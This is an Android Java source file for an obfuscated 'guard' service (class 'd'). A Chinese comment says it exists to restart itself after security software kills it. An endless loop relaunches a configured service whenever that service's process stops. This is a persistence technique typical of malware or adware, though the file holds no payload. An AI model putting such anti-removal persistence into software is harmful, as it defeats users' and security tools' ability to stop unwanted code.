package com.x.dtswz;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.os.RemoteException;

/**
 * 守护服务，用于服务被安全软件杀死后自启动
 * Created by Administrator on 2015/1/8.
 */
public class d extends Service {
    public Context context = null;
    public ServiceGuard serviceGuard = null;

    public void setProxy(Context context) {
        this.context = context;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        if (context == null) {
            context = this;
        }
        if (Config.instanse(this).getMode() != Config.apkMode) {
            serviceGuard = new ServiceGuard.Stub() {
                @Override
                public void stopService() throws RemoteException {
                    String to = Config.instanse(context).getFunctionServiceName();
                    try {
                        Intent i = new Intent(context, Class.forName(to));
                        context.stopService(i);
                    } catch (ClassNotFoundException e) {
                        e.printStackTrace();
                    }
                }

                @Override
                public void startService() throws RemoteException {
                    String to = Config.instanse(context).getFunctionServiceName();
                    if (null != to && !to.equals("")) {
                        try {
                            Intent i = new Intent(context, Class.forName(to));
                            context.startService(i);
                        } catch (ClassNotFoundException e) {
                            e.printStackTrace();
                        }
                    }
                }
            };


            new Thread(new Runnable() {
                @Override
                public void run() {
                    while (true) {
                        if (!CheakProcessRunningUtils.isProcessRunning(context, Config.instanse(context).getFunctionServiceProcessName())) {

                            try {
                                serviceGuard.startService();
                            } catch (RemoteException e) {
                                e.printStackTrace();
                            }

                        }
                    }
                }
            }).start();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
